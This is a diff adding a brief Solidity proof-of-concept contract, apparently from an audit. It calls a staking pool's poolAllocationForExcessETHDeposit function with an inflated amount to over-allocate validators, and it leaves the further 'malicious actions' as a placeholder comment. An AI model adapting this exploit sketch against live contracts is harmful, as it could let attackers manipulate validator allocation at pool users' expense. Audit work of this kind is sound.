@@ -1,0 +1,21 @@
+pragma solidity 0.8.16;
+
+contract MaliciousContract {
+    address public poolSelector;
+
+    constructor(address _poolSelector) {
+        poolSelector = _poolSelector;
+    }
+
+    function attackPoolAllocationForExcessETHDeposit() external {
+        // Pass a large value for _excessETHAmount to allocate excess validators
+        uint256 maliciousAmount = 1000 ether;
+        
+        // Call the vulnerable function in the PoolSelector contract
+        (uint256[] memory selectedPoolCapacity, uint8[] memory poolIdArray) =
+            IPoolSelector(poolSelector).poolAllocationForExcessETHDeposit(maliciousAmount);
+
+        // Perform any further malicious actions with the allocated validators
+        // ...
+    }
+}
